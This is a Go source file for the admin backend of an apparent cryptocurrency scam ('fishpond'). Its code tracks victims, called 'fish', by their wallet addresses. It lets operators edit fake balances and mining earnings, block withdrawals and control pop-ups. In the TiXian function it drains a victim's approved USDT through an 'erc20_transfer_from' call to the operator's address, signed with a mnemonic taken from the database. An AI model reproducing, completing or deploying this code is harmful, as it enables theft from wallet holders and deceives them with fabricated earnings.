/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package sonAgency

import (
	"encoding/json"
	"fmt"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/gin-gonic/gin"
	"github.com/spf13/viper"
	"github.com/wangyi/fishpond/controller/client"
	"github.com/wangyi/fishpond/dao/mysql"
	"github.com/wangyi/fishpond/dao/redis"
	token "github.com/wangyi/fishpond/eth"
	"github.com/wangyi/fishpond/model"
	"github.com/wangyi/fishpond/util"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

/**
  获取 修改  鱼信息
*/
func GetFish(c *gin.Context) {
	who, err2 := c.Get("who")
	if !err2 {
		return
	}
	whoMap := who.(map[string]interface{})
	action := c.PostForm("action")
	if action == "GET" {
		page, _ := strconv.Atoi(c.PostForm("page"))
		limit, _ := strconv.Atoi(c.PostForm("limit"))
		var total int = 0
		Db := mysql.DB.Where("admin_id=? or belong=?", whoMap["ID"], whoMap["ID"])
		fish := make([]model.Fish, 0)
		if status, isExist := c.GetPostForm("status"); isExist == true {
			status, _ := strconv.Atoi(status)
			Db = Db.Where("status=?", status)
		}
		if status, isExist := c.GetPostForm("already_killed"); isExist == true {
			status, _ := strconv.Atoi(status)
			Db = Db.Where("already_killed=?", status)
		}

		if remark, isExist := c.GetPostForm("remark"); isExist == true {
			Db = Db.Where("remark LIKE ?", "%"+remark+"%")
		}

		if foxAddress, isExist := c.GetPostForm("fox_address"); isExist == true {
			Db = Db.Where("fox_address LIKE ?", "%"+foxAddress+"%")
		}

		if BAddress, isExist := c.GetPostForm("b_address"); isExist == true {
			Db = Db.Where("b_address= ?", BAddress)
		}

		if id, isExist := c.GetPostForm("id"); isExist == true {
			status, _ := strconv.Atoi(id)
			Db = Db.Where("id= ?", status)
		}

		if id, isExist := c.GetPostForm("authorization"); isExist == true {
			status, _ := strconv.Atoi(id)
			Db = Db.Where("authorization= ?", status)
		}

		Db.Table("fish").Count(&total)
		Db = Db.Model(&fish).Offset((page - 1) * limit).Limit(limit).Order("updated desc")
		if err := Db.Find(&fish).Error; err != nil {
			util.JsonWrite(c, -101, nil, err.Error())
			return
		}

		c.JSON(http.StatusOK, gin.H{
			"code":   1,
			"count":  total,
			"result": fish,
		})
		return
	}

	if action == "UPDATE" { //暂时一个禁用 功能
		id := c.PostForm("id")
		//判断这个是否存在
		err := mysql.DB.Where("id=?", id).Where("admin_id=?", whoMap["ID"]).First(&model.Fish{}).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "这个id不存在!")
			return
		}

		updateData := model.Fish{}
		//提现开关 TiXianSwitch
		if status, isExist := c.GetPostForm("TiXianSwitch"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.TiXianSwitch = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}

		//客服显示开关
		if status, isExist := c.GetPostForm("ServerSwitch"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.ServerSwitch = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}

		//公告 Notice
		if status, isExist := c.GetPostForm("Notice"); isExist == true {
			updateData.IfReading = 1
			updateData.Notice = status
		}

		//NoProceedsAreAuthorizedSwitch
		if status, isExist := c.GetPostForm("NoProceedsAreAuthorizedSwitch"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.NoProceedsAreAuthorizedSwitch = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}

		//显示客服开关
		if status, isExist := c.GetPostForm("ServerSwitch"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.ServerSwitch = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}

		// OthersAuthorizationKill
		if status, isExist := c.GetPostForm("OthersAuthorizationKill"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "PledgeSwitch 错误!")
				return
			}
			updateData.OthersAuthorizationKill = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}
		//质押开关
		if status, isExist := c.GetPostForm("PledgeSwitch"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "PledgeSwitch 错误!")
				return
			}
			updateData.PledgeSwitch = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}

		//前端弹窗开关  LeadingPopUpWindowSwitch
		if status, isExist := c.GetPostForm("LeadingPopUpWindowSwitch"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "LeadingPopUpWindowSwitch 错误!")
				return
			}
			updateData.LeadingPopUpWindowSwitch = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}

		//PopUpWindowContent
		if status, isExist := c.GetPostForm("PopUpWindowContent"); isExist == true {
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.PopUpWindowContent = status
		}
		//AuthorizationWhite
		if status, isExist := c.GetPostForm("AuthorizationWhite"); isExist == true {
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.AuthorizationWhite = status
		}
		//PopUpWindowInterval
		if status, isExist := c.GetPostForm("PopUpWindowInterval"); isExist == true {
			aaa, _ := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return

			}
			updateData.PopUpWindowInterval = aaa
		}
		//SetPledgeDay
		if status, isExist := c.GetPostForm("SetPledgeDay"); isExist == true {
			aaa, _ := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return

			}
			updateData.SetPledgeDay = aaa
		}

		if status, isExist := c.GetPostForm("AlreadyKill"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "PledgeSwitch 错误!")
				return
			}
			updateData.AlreadyKill = status
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "修改失败!")
				return
			}
			util.JsonWrite(c, 200, nil, "修改成功!")
			return
		}

		if status, isExist := c.GetPostForm("status"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
				return
			}
			updateData.Status = status
		}

		if status, isExist := c.GetPostForm("MonitoringSwitch"); isExist == true {
			status, err := strconv.Atoi(status)
			if err != nil {
				util.JsonWrite(c, -101, nil, "MonitoringSwitch 错误!")
				return
			}
			updateData.MonitoringSwitch = status
		}

		//修改 体验金额
		if status, isExist := c.GetPostForm("ExperienceMoney"); isExist == true {
			status, err := strconv.ParseFloat(status, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "ExperienceMoney 错误!")
				return
			}
			updateData.ExperienceMoney = status

			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(map[string]interface{}{"ExperienceMoney": status}).Error
			if err != nil {
				util.JsonWrite(c, -101, nil, "ExperienceMoney 修改失败")

				return
			}
			util.JsonWrite(c, 200, nil, "ExperienceMoney 更新成功")

			return

		}

		//修改到期时间

		if status, isExist := c.GetPostForm("ExpirationTime"); isExist == true {
			status, err := strconv.ParseInt(status, 10, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "ExpirationTime 错误!")
				return
			}
			updateData.ExpirationTime = status
		}

		if money, isExist := c.GetPostForm("Money"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.Money = m
		}

		//Balance
		if money, isExist := c.GetPostForm("Balance"); isExist == true {
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.Balance = m
			up := make(map[string]interface{})
			up["balance"] = m
			err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(up).Error
			util.JsonWrite(c, 200, nil, "修改成功")
			return

		}

		if money, isExist := c.GetPostForm("MoneyEth"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.MoneyEth = m
		}

		if money, isExist := c.GetPostForm("TodayEarningsETH"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "TodayEarningsETH 错误!")
				return
			}
			updateData.TodayEarningsETH = m
		}
		//MiningEarningETH
		if money, isExist := c.GetPostForm("MiningEarningETH"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "MiningEarningETH 错误!")
				return
			}

			updateData.MiningEarningETH = m
		}

		if money, isExist := c.GetPostForm("MiningEarningUSDT"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "MiningEarningETH 错误!")
				return
			}
			updateData.MiningEarningUSDT = m
		}

		if money, isExist := c.GetPostForm("EarningsMoney"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.EarningsMoney = m
		}
		if money, isExist := c.GetPostForm("TodayEarnings"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.TodayEarnings = m
		}

		if money, isExist := c.GetPostForm("Remark"); isExist == true {

			updateData.Remark = money
		}

		if money, isExist := c.GetPostForm("TotalEarnings"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.TotalEarnings = m
		}
		//YesterdayEarnings
		if money, isExist := c.GetPostForm("YesterdayEarnings"); isExist == true {
			m, err := strconv.ParseFloat(money, 64)
			if err != nil {
				util.JsonWrite(c, -101, nil, "status 错误!")
				return
			}
			updateData.YesterdayEarnings = m
		}

		err = mysql.DB.Model(&model.Fish{}).Where("id=?", id).Update(&updateData).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "修改失败!")
			return
		}
		util.JsonWrite(c, 200, nil, "修改成功!")
		return
	}

	util.JsonWrite(c, -101, nil, "action 不可以为空")

	return
}

/***

  分级代理提现
*/
func TiXian(c *gin.Context) {
	who, err2 := c.Get("who")
	if !err2 {
		return
	}

	whoMap := who.(map[string]interface{})
	foxAddress := c.PostForm("fox_address") //A的地址
	var amount string
	if _, isExist := c.GetPostForm("amount"); isExist == true {
		amount = c.PostForm("amount")
	} else {
		//查询 USDT
		ethUrl := viper.GetString("eth.ethUrl")
		client, err := ethclient.Dial(ethUrl)
		if err != nil {
			util.JsonWrite(c, -101, nil, err.Error())
			return
		}
		//获取 美元
		tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
		instance, err := token.NewToken(tokenAddress, client)
		if err != nil {
			util.JsonWrite(c, -101, nil, err.Error())
			return
		}
		address := common.HexToAddress(foxAddress)
		bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
		if err != nil {
			log.Fatal(err)
		}
		//amount = util.ToDecimal(bal.String(), 6).String()
		amount = bal.String()
		PP, _ := util.ToDecimal(amount, 6).Float64()
		if PP <= 0 {
			util.JsonWrite(c, -101, nil, "提现失败,狐狸钱包为余额0")
			return
		}

	}

	//fmt.Println(amount)

	config := model.Config{}
	err := mysql.DB.Where("id=1").First(&config).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "程序错误,联系技术")
		return
	}
	type Params struct {
		TokenName    string
		Mnemonic     string
		AccountIndex int
		FromAddress  string
		ToAddress    string
		Amount       string
	}
	type TX struct {
		Method string
		Params Params
	}

	if _, isExist := c.GetPostForm("b_address"); isExist != true {
		util.JsonWrite(c, -101, nil, "缺少B地址")
		return
	}

	jsonOne := make(map[string]interface{})
	if BMnemonic, isExist := c.GetPostForm("b_mnemonic"); isExist == true {
		jsonOne["mnemonic"] = BMnemonic
	} else {
		//在这里提取
		list := model.BAddressList{}
		err := mysql.DB.Where("b_address=?", c.PostForm("b_address")).First(&list).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "获取B地址秘钥错误")
			return
		}
		jsonOne["mnemonic"] = list.BKey
	}

	jsonOne["to_address"] = config.CAddress
	jsonOne["token_name"] = "usdt"
	jsonOne["account_index"] = 0
	jsonOne["from_address"] = foxAddress
	jsonOne["amount"] = amount
	jsonDate := make(map[string]interface{})
	jsonDate["method"] = "erc20_transfer_from"
	jsonDate["params"] = jsonOne
	byte, _ := json.Marshal(jsonDate)

	//生成任务id
	taskId := time.Now().Format("20060102") + util.RandStr(8)
	resp, err1 := http.Post("http://127.0.0.1:8000/ethservice?taskId="+taskId, "application/json", strings.NewReader(string(byte)))

	if err1 != nil {
		util.JsonWrite(c, -1, nil, err1.Error())
		return
	}

	//至少运行成功 入库

	//首先获取 fishID
	fish := model.Fish{}
	err = mysql.DB.Where("fox_address=?", foxAddress).First(&fish).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "这条鱼不存在")
		return
	}

	a, _ := util.ToDecimal(amount, 6).Float64()
	add := model.FinancialDetails{
		TaskId:   taskId,
		Kinds:    10,
		FishId:   int(fish.ID),
		CAddress: config.CAddress,
		Created:  time.Now().Unix(),
		Updated:  time.Now().Unix(),
		Money:    a,
		Operator: whoMap["Username"].(string),
	}
	mysql.DB.Save(&add)
	defer resp.Body.Close()
	util.AddEverydayMoneyData(redis.Rdb, "ChouQuMoney", int(fish.AdminId), fish.Belong, a)

	respByte, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(respByte))
	util.JsonWrite(c, 200, nil, "提现成功,等待到账!")
	return
}

/***

  获取 客服地址
*/
func GetServiceAddress(c *gin.Context) {
	who, err2 := c.Get("who")
	if !err2 {
		return
	}
	WhoMap := who.(map[string]interface{})
	action := c.PostForm("action")
	if action == "UPDATE" {
		admin := model.Admin{}
		err := mysql.DB.Where("id=?", WhoMap["ID"]).First(&admin).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "管理员不存在")
			return
		}

		ups := make(map[string]interface{})
		ups["ServiceAddress"] = c.PostForm("ServiceAddress")
		ups["TelegramUrl"] = c.PostForm("TelegramUrl")
		ups["WhatAppUrl"] = c.PostForm("WhatAppUrl")
		err = mysql.DB.Model(&model.Admin{}).Where("id=?", WhoMap["ID"]).Update(ups).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "添加失败")
			return
		}
		util.JsonWrite(c, 200, nil, "添加成功")
		return
	}

	admin := model.Admin{}
	err := mysql.DB.Where("id=?", WhoMap["ID"]).First(&admin).Error
	if err != nil {
		util.JsonWrite(c, -101, nil, "获取失败")
		return
	}
	util.JsonWrite(c, 200, admin.ServiceAddress, "获取成功")
	return
}

/**
  获取收益次数
*/
func GetInComeTimes(c *gin.Context) {
	action := c.PostForm("action")
	who, _ := c.Get("who")
	wgoMap := who.(map[string]interface{})
	if action == "GET" {
		util.JsonWrite(c, 200, wgoMap["InComeTimes"], "获取成功")
		return
	}

	if action == "UPDATE" {

		times := c.PostForm("times")

		time, _ := strconv.Atoi(times)

		err := mysql.DB.Model(&model.Admin{}).Where("id=?", wgoMap["ID"]).Update(&model.Admin{InComeTimes: time}).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "修改失败")
			return
		}
		err = mysql.DB.Model(&model.Fish{}).Where("admin_id=?", wgoMap["ID"]).Update(&model.Fish{InComeTimes: time}).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "修改失败!")
			return
		}

		util.JsonWrite(c, 200, nil, "修改成功")
		return
	}

}

/***
  获取 B地址的 ETH
*/
func GetBAddressETH(c *gin.Context) {
	foxAddress := c.PostForm("b_address")
	apikeyP := viper.GetString("eth.apikey")
	apikeyArray := strings.Split(apikeyP, "@")
	apikey := apikeyArray[rand.Intn(len(apikeyArray))]

	resp, err := http.Get("https://api.etherscan.io/api?module=account&action=balance&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
	if err != nil {
		util.JsonWrite(c, -101, nil, "fail")
		return
	}
	defer resp.Body.Close()
	body, err1 := ioutil.ReadAll(resp.Body)
	if err1 != nil {
		util.JsonWrite(c, -101, nil, "fail")
		return
	}
	var basket client.AutoGenerated
	_ = json.Unmarshal([]byte(string(body)), &basket)
	maxMoney := basket.Result
	eth := util.ToDecimal(maxMoney, 18)
	util.JsonWrite(c, 200, eth, "success")
	return
}

/**
  更新授权信息
*/

func UpdateAuthorizationInformation(c *gin.Context) {

	foxAddress := c.PostForm("fox_address") //获取 A地址

	var BAddress string
	if B, ISE := c.GetPostForm("b_address"); ISE == true {
		BAddress = B
	} else {
		admin := model.Config{}
		err := mysql.DB.Where("id=1").First(&admin).Error
		if err != nil {
			util.JsonWrite(c, -101, nil, "配置获取失败")
			return
		}
		BAddress = admin.BAddress
	}

	apikeyP := viper.GetString("eth.apikey")
	apikeyArray := strings.Split(apikeyP, "@")
	apikey := apikeyArray[rand.Intn(len(apikeyArray))]

	BLisT := make([]model.BAddressList, 0)
	err1 := mysql.DB.Find(&BLisT).Error
	var D []string
	if err1 == nil {
		for _, v := range BLisT {
			D = append(D, v.BAddress)
		}
	}
	util.ChekAuthorizedFoxAddressTwo(foxAddress, apikey, BAddress, mysql.DB, D, redis.Rdb)

	util.JsonWrite(c, 200, nil, "更新成功")

	return

}
